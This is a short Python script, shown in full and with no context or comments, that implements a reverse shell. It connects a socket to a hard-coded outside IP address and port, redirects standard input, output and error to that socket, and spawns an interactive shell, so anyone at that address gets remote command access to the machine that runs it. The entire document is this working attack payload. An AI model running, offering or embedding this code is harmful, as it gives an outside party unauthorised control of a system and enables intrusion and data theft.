import os,pty,socket
s=socket.socket()
s.connect(("92.247.214.122",9876))
[os.dup2(s.fileno(),f)for f in(0,1,2)]
pty.spawn("sh")
